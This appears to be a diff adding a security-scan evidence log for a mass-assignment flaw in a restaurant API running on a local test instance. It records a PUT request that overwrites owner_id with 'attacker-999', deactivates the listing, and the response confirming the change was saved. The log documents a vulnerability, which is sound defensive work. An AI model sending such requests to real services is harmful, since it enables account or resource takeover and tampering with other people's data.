@@ -1,0 +1,11 @@
+================================================================
+EV-M2 : Mass assignment - attacker overwrites owner_id / is_active / price through generic PUT (req.body passed whole)  [2026-09-21 15:30:07]
+Target: http://localhost:3101  (temporary scan instance, dedicated scan DB)
+================================================================
+
+---- REQUEST ----
+PUT http://localhost:3101/api/restaurants/<id> body: {owner_id:'attacker-999', is_active:false, rating:1}
+---- RESPONSE ----
+{"location":{"type":"Point","coordinates":[79.86,6.92],"tag":"a"},"_id":"6ab10027c8e0b39c95d1e392","name":"VulnSpot","image":"i.png","rating":1,"deliveryTime":"30m","deliveryFee":"Rs100","minOrder":"Rs300","distance":"1km","cuisines":["x"],"priceLevel":1,"is_active":false,"open_time":"08:00 AM","closed_time":"10:00 PM","owner_id":"attacker-999","createdAt":"2026-09-21T10:00:07.940Z","updatedAt":"2026-09-21T10:00:07.981Z","__v":0}
+--- GET shows owner_id now attacker-999 and is_active:false (persisted) ---
+{"location":{"type":"Point","coordinates":[79.86,6.92],"tag":"a"},"_id":"6ab10027c8e0b39c95d1e392","name":"VulnSpot","image":"i.png","rating":1,"deliveryTime":"30m","deliveryFee":"Rs100","minOrder":"Rs300","distance":"1km","cuisines":["x"],"priceLevel":1,"is_active":false,"open_time":"08:00 AM","closed_time":"10:00 PM","owner_id":"attacker-999","createdAt":"2026-09-21T10:00:07.940Z","updatedAt":"2026-09-21T10:00:07.981Z","__v":0}
